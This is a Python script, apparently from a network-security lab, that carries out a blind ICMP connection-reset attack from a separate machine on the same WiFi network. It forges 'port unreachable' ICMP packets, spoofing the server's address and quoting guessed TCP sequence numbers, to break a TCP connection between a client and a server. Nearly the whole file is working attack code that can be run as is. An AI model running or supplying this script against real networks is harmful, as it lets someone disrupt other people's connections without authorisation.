#!/usr/bin/env python3
"""
Attack 1 - ICMP Blind Connection-Reset (real-WiFi variant)

Runs on a separate attacker machine on the same WiFi network.

Usage:
    sudo python3 attack1_reset_wifi.py <client_port> [client_ip] [server_ip]

If no arguments are given, the default IPs and client port below are used.
"""

import sys
import time

from scapy.all import IP, ICMP, TCP, send, conf


DEFAULT_CLIENT_IP = "192.168.0.201"
DEFAULT_SERVER_IP = "192.168.0.202"

DEFAULT_CLIENT_PORT = 40000
SERVER_PORT = 5201

CLIENT_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_CLIENT_PORT
CLIENT_IP = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_CLIENT_IP
SERVER_IP = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_SERVER_IP

ASSUMED_WINDOW = 2_600_000
SEQ_SPACE = 2 ** 32
num_guesses = max(1, SEQ_SPACE // ASSUMED_WINDOW)


print("⦿ Attack configuration:")
print("    Client      :", CLIENT_IP)
print("    Server      :", SERVER_IP)
print("    Client port :", CLIENT_PORT)
print("    Server port :", SERVER_PORT)
print("    Guesses     :", num_guesses)

route = conf.route.route(CLIENT_IP)

print("⦿ Route to client:")
print("    interface:", route[0])
print("    gateway  :", route[2])
print("    source   :", route[1])

if route[0] == "lo":
    raise RuntimeError(
        "Scapy is routing the attack toward loopback. "
        "Make sure you're running this on the ATTACKER machine, "
        "not on the machine hosting the client/server aliases."
    )


packets = []

for i in range(num_guesses):

    seq = (i * ASSUMED_WINDOW) % SEQ_SPACE

    offending = (
        IP(
            src=CLIENT_IP,
            dst=SERVER_IP,
            proto=6
        )
        /
        TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            flags="A",
            seq=seq,
            ack=0
        )
    )

    forged_icmp = (
        IP(
            src=SERVER_IP,
            dst=CLIENT_IP
        )
        /
        ICMP(
            type=3,
            code=3
        )
        /
        offending
    )

    packets.append(forged_icmp)


print("⦿ Sending %d forged ICMP packets..." % len(packets))

t0 = time.time()

send(
    packets,
    verbose=False
)

elapsed = time.time() - t0

print(
    "⦿ Sent %d packets in %.2f seconds."
    % (len(packets), elapsed)
)

print("⦿ Now check the client's TCP connection state on the target machine.")